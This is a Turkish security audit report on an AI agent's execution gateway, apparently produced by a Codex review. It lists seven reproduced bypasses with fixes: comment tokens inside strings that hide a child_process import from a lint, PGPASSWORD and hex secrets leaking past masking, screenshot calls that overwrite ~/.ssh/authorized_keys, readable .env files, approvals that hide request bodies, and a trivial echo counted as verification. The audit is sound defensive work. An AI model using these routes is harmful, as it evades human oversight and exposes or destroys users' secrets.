# Codex tur 3 — bulgular (29.07.2026)

`codex exec --sandbox read-only` ile çalıştırıldı; brifing
[`CODEX-DENETIM.md`](CODEX-DENETIM.md) → "Tur 3".

**Yedi bulgu verildi, yedisi de tetiklenerek doğrulandı, yedisi de kapatıldı.**
Bu turda yanlış alarm yok — tur 1'de bir kısım bulgu şema dosyasından okunmuş
varsayımdı. Aradaki fark brifingteki kuralın tekrarı: *tetikleyemediğin şey
bulgu değildir.*

Codex ayrıca üç iddiayı **doğrulanmış** saydı: `code_execution` onay kapısını
atlayan canlı bir yol bulamadı, `grep_search`'ün model yolu süzülüyor, ve
`_grepWithNode` yalnızca testlerden çağrılıyor. Bir soruda da "EMİN DEĞİLİM"
yazıp bulgu saymadı — istenen davranış tam olarak buydu.

## Kapanış özeti

| # | Bulgu | Düzeltme |
|---|---|---|
| 1 | Dizedeki `/*` sınır lint'ini körleştiriyor | Blok yorum regex'i kaldırıldı; yalnızca satır başı belirteçleri ayıklanıyor |
| 2 | `PGPASSWORD` alt sürece geçiyor | Ada dayalı süzgeç ayıraçsız adları da kapsıyor (`PGHOST` geçmeye devam ediyor) |
| 3 | 40 haneli hex gerçek sır taşıyabilir | Muafiyet bağlama duyarlı: `SECRET=` sağındaki hex maskeleniyor, git SHA'sı değil |
| 4 | `read_file` / `document_extract` süzülmüyor | `document_extract` maskeliyor; `read_file` **maskelemiyor**, uyarıyor — gerekçe aşağıda |
| 5 | `file` / `outputPath` / `.env` kapsam dışı | Argüman adları eklendi; `.env` engelli, `.env.example` serbest |
| 6 | Onay gövdenin içeriğini göstermiyor | Maskeli önizleme eklendi |
| 7 | İlgisiz komut "doğrulama" sayılıyor | Kara liste + sıralama koşulu; kaydedilen metin komutu yazıyor |

### Bulgu 4'te Codex'in önerisi uygulanmadı — sebebi

`read_file`ı da maskelemek daha büyük bir hata olurdu. Çıktısı düzenleme
döngüsünde geri yazılır ("oku → değiştir → `write_file`"); maskelenmiş içerik
geri yazılırsa kullanıcının gerçek anahtarı `sk-a***LLLL` ile **ezilir**.
Sessiz veri kaybı, sessiz ifşadan kötüdür ve geri alınamaz.

Onun yerine içerik olduğu gibi dönüyor ve yanına `sirUyarisi` konuyor. Asıl
savunma yol politikası: `.env`, `.ssh`, `.aws` zaten engelli.

Testler: `test/security/codex-tur3.test.js` (15 test).

---

## Bulgu 1 — Yorum belirteçlerini dizeye koymak sınır lint’ini körleştiriyor

**Dosya:** `scripts/gateway-boundary-check.mjs:83`, `scripts/gateway-boundary-check.mjs:110`  
**Nasıl tetiklenir:** İzinli paket dışındaki bir kaynak dosyasına şu kodu ekleyip `node scripts/gateway-boundary-check.mjs` çalıştır:

```js
const baslangic = "/*";
const { spawn } = require("node:child_process");
const bitis = "*/";
```

Kod çalışırken `require` yürütülür. Lint ise 84/111. satırlardaki regex ile dize içindeki `/*` ile `*/` arasını yorum sanarak tamamen siler; 48–52. satırlardaki yasak desenler importu göremez.

**Neden önemli:** Dize birleştirme gibi kasıtlı kaçışların yanında, doğrudan ve normal yazılmış `require("node:child_process")` bile yorum ayıklayıcısının sözdizimi bilmemesi nedeniyle görünmez olabilir.  
**Güven:** yüksek

## Bulgu 2 — `PGPASSWORD` alt sürece aynen geçiyor

**Dosya:** `src/utils/gateway.js:183`, `src/utils/gateway.js:194`, `src/utils/gateway.js:223`  
**Nasıl tetiklenir:** Ana süreci `PGPASSWORD=correct-horse-battery` ile başlat; ardından onaylanmış `code_execution` içinde `process.env.PGPASSWORD` yazdır. Ad `SIR_ANAHTARI` desenine uymaz: `_PASSWORD` ile bitmez, yalnızca `PGPASSWORD` olur. Değer de bilinen anahtar biçimi veya gömülü bağlantı dizesi değildir.

**Neden önemli:** `PGPASSWORD`, PostgreSQL istemcilerinin yaygın ve doğrudan parola taşıyan standart ortam değişkenidir. Modelin çalıştırdığı kod parolayı okuyabilir.  
**Güven:** yüksek

## Bulgu 3 — 40 haneli onaltılık gerçek sır maskelenmeden geçirilebilir

**Dosya:** `src/utils/secret-scanner.js:28`, `src/utils/secret-scanner.js:136`, `src/utils/secret-scanner.js:158`  
**Nasıl tetiklenir:** Bir dosyaya tırnaksız, uygulamada gerçekten imzalama sırrı olarak kullanılan şu biçimde bir değer koy:

```text
WEBHOOK_SECRET=0123456789abcdef0123456789abcdef01234567
```

Ardından `grep_search` ile bu satırı getir. Değer 40 karakterlik genel desene uyar, fakat `masumMu()` saf hex olduğu için eşleşmeyi değişmeden bırakır. Tırnaksız yazıldığı için “Generic Password Assignment” deseni de devreye girmez.

**Neden önemli:** Bir değerin git SHA’sına benzemesi onun git SHA’sı olduğunu kanıtlamaz. 160 bitlik hex webhook/HMAC sırları gerçek ve geçerli kimlik bilgileri olabilir. Aynı muafiyet `degerSirMi()` içinde de `src/utils/gateway.js:205` satırında bulunuyor.  
**Güven:** yüksek

## Bulgu 4 — Dosya içeriği döndüren diğer araçlar sır süzgecinden geçmiyor

**Dosya:** `src/tools/document_extract.js:35`, `src/tools/document_extract.js:72`, `src/tools/read_file.js:74`, `src/tools/read_file.js:78`  
**Nasıl tetiklenir:** Hassas yol desenlerine uymayan `notes.txt` dosyasına bir GitHub tokeni veya yukarıdaki 40-hex sırrı koy. `document_extract({path:"notes.txt"})` ya da `read_file({path:"notes.txt"})` çağır. İçerik doğrudan `content` alanında döner; `maskText` çağrısı yoktur.

**Neden önemli:** `grep_search` sonuçları `src/tools/grep_search.js:241` üzerinden süzülürken, aynı dosya içeriği diğer araçlardan ham olarak model geçmişine ve sağlayıcıya gidebilir. `_grepWithNode` için canlı model kaçışı bulamadım: dışa açık olsa da depoda yalnızca testler çağırıyor; model yolu `execute()` üzerinden geçiyor.  
**Güven:** yüksek

## Bulgu 5 — Yol politikası `file`/`outputPath` argümanlarını ve `.env` dosyalarını görmüyor

**Dosya:** `src/utils/tool-path-policy.js:6`, `src/utils/tool-path-policy.js:39`, `src/tools/computer_use.js:116`, `src/tools/macos_screenshot.js:16`  
**Nasıl tetiklenir:**

- `computer_use({action:"screenshot", file:"~/.ssh/authorized_keys"})` çağrısında politika `file` argümanını okumaz; ekran görüntüsü aracı bu yolu çıktı dosyası olarak kullanır.
- macOS’ta `macos_screenshot({outputPath:"~/.ssh/authorized_keys"})` aynı şekilde `outputPath` üzerinden politikayı atlar.
- Projedeki `.env` dosyasını `read_file({path:".../.env"})` ile oku. `SENSITIVE_READ` içinde `.env` deseni bulunmadığından izin verilir.

**Neden önemli:** İlk iki çağrı kullanıcıya ait hassas dosyaları ekran görüntüsü verisiyle ezebilir. `.env` ise en yaygın sır dosyalarından biri olmasına rağmen hassas yol kabul edilmiyor.  
**Güven:** yüksek

## Bulgu 6 — Ağ onayı gönderilen gövdenin içeriğini göstermiyor

**Dosya:** `packages/execution-gateway/src/index.ts:694`, `packages/execution-gateway/src/index.ts:706`, `src/tools/http_request.js:21`  
**Nasıl tetiklenir:** Şu iki POST isteğini karşılaştır:

```json
{"url":"https://example.test/upload","method":"POST","body":"AAAAAAAAAAAAAAAA"}
```

```json
{"url":"https://example.test/upload","method":"POST","body":"prod-db-password"}
```

Aynı uzunluktalarsa onay ekranında ikisi için de yalnızca aynı hedef, yöntem ve “gövde 16 bayt” görünür. Gövdenin alanları, özetlenmiş/maskelenmiş önizlemesi veya veri sınıfı gösterilmez.

**Neden önemli:** Kullanıcı verinin gönderildiğini anlar ama hangi verinin gönderildiğini ayırt edemez. Boyut tek başına bilinçli sızıntı kararına yetmez.  
**Güven:** yüksek

## Bulgu 7 — İlgisiz başarılı komut “doğrulama” sayılıp yanlış hafıza yazdırıyor

**Dosya:** `src/tools/agentic-runner.js:547`, `src/tools/agentic-runner.js:568`, `src/tools/agentic-runner.js:571`  
**Nasıl tetiklenir:**

1. Görev: “`hesapla()` fonksiyonunu 42 döndürecek şekilde düzelt.”
2. Ajan dosyayı değiştirip yanlışlıkla `41` döndürsün; yazma aracı başarılı olsun.
3. Ajan doğrulama yerine güvenli `bash` komutu olarak `echo tamam` çalıştırsın. Çıkış kodu sıfır olduğundan kayıt `done` olur.
4. Statik kalite kapısı bu anlamsal hatayı bloklamasın.

`dogrulama`, değiştirilen dosyayla veya görevle ilişkisini kontrol etmeden ilk başarılı `bash|shell_command|code_execution` kaydını kabul eder. Ardından hafızaya “dosya değişti ve doğrulandı” yazılır.

**Neden önemli:** Üç biçimsel koşul da sağlandığı hâlde doğrulama gerçekte yapılmamıştır. Yanlış başarı iddiası sonraki oturumlara kalıcı proje gerçeği olarak taşınır.  
**Güven:** yüksek

## Doğrulanan iddialar

- `code_execution`: Modelin `onayli` geçirebildiği canlı yol bulamadım. Genel araç çalıştırıcı bayrağı siliyor; `agentic-runner` da `executeThroughGateway` kullanıyor. **İddia doğrulandı.**
- Ortam temizliği: `PGPASSWORD` kaçıyor. **İddia doğrulanmadı.**
- 40-hex muafiyeti: Gerçek 160 bitlik hex sır taşıyabilir. **İddia doğrulanmadı.**
- `grep_search`: Modelin kullandığı `execute()` yolu süzülüyor; `_grepWithNode` yalnızca testlerde doğrudan çağrılıyor. Ancak `read_file` ve `document_extract` aynı içerik süzmesini uygulamıyor. **Kısmen doğrulandı.**
- Yol politikası: Varsayılan olarak çağrılıyor, fakat `file`, `outputPath` ve `.env` kapsam dışında. **İddia doğrulanmadı.**
- Sınır lint’i: Normal importlarda cırcır çalışıyor; dize içindeki yorum belirteçleriyle görünmez kılınabiliyor. **Sıkılık iddiası doğrulanmadı.**
- Ağ onayı: Etkileşimli ajan aynı TTY’yi kullandığından araçlar kullanılabilir. TTY’siz/headless ajanlarda ağ araçları gerçekten reddedilir. Onay metni gövde içeriğini göstermiyor.
- Hafıza: Üç biçimsel koşul kodda uygulanıyor; “doğrulama”nın ilgili ve anlamlı olması uygulanmıyor. **Doğruluk iddiası doğrulanmadı.**
- RECALL çerçevesinin modele karşı deterministik biçimde aşılabildiğini yalnızca kod okuyarak kanıtlayamadım: **EMİN DEĞİLİM; bulgu saymadım.**

Depoda değişiklik yapılmadı.
tokens used
149.132
